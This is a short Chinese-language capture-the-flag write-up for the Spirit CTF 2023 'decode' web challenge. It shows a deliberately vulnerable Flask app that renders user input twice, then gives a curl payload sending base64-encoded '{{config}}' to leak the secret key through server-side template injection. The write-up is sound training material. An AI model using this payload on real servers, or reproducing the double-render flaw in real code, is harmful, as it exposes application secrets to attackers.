# Spirit CTF 2023 热身赛题解 - decode
#Web #python #flask #SSTI 

```python
from flask import Flask, request, render_template, render_template_string
import os
import base64

app = Flask(__name__)
app.secret_key = os.getenv('FLAG')


def render(result, status, lastInput):
    return render_template('./index.html',
                           result=result,
                           status=status,
                           lastInput=lastInput)


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        try:
            return render_template_string(
                render(base64.b64decode(request.form.get('expr')).decode('utf-8'), 'success',
                       request.form.get('expr')))
        except:
            return render('Dame dane~', 'failure', request.form.get('expr'))
    else:
        return render('', '', '')


app.run(host='0.0.0.0', port=1234)
```

这题源码是后来放出的，没有源码的话也可以通过`Server`响应头推测出是`flask`作为后端。

代码逻辑中完成base64解码的用户输入在渲染了一次之后又经过了一次多余的渲染，于是有了SSTI（Server-Side Template Injection）的可能性。

利用方式是构造模板字符串，base64编码后作为用户输入，服务器解码后渲染一次无恙，第二次渲染便遇到了我们构造的非法模板。

另一个知识点是`flask`的配置在可以通过全局变量`config`获取。

```shell
curl --data expr="$(echo '{{config}}' | base64)" http://<host>:<port>/
```

![](<./img/Pasted image 20230508010747.png>)
